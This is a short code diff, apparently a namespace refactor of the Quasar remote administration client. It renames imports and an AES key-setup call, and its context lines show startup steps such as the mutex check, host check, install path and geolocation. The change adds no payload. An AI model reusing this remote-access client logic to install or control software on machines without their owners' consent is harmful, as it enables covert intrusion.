@@ -3,14 +3,14 @@ using System.Diagnostics;
 using System.IO;
 using System.Threading;
 using System.Windows.Forms;
+using Quasar.Client.Commands;
 using Quasar.Client.Config;
-using Quasar.Client.Core.Commands;
-using Quasar.Client.Core.Cryptography;
-using Quasar.Client.Core.Data;
-using Quasar.Client.Core.Helper;
-using Quasar.Client.Core.Installation;
-using Quasar.Client.Core.Networking;
-using Quasar.Client.Core.Utilities;
+using Quasar.Client.Data;
+using Quasar.Client.Helper;
+using Quasar.Client.Installation;
+using Quasar.Client.Networking;
+using Quasar.Client.Utilities;
+using Quasar.Common.Cryptography;
 
 namespace Quasar.Client
 {
@@ -90,7 +90,7 @@ namespace Quasar.Client
             if (!MutexHelper.CreateMutex(Settings.MUTEX) || hosts.IsEmpty || string.IsNullOrEmpty(Settings.VERSION)) // no hosts to connect
                 return false;
 
-            AES.SetDefaultKey(Settings.KEY, Settings.AUTHKEY);
+            Aes128.SetDefaultKey(Settings.KEY, Settings.AUTHKEY);
             ClientData.InstallPath = Path.Combine(Settings.DIRECTORY, ((!string.IsNullOrEmpty(Settings.SUBDIRECTORY)) ? Settings.SUBDIRECTORY + @"\" : "") + Settings.INSTALLNAME);
             GeoLocationHelper.Initialize();
             
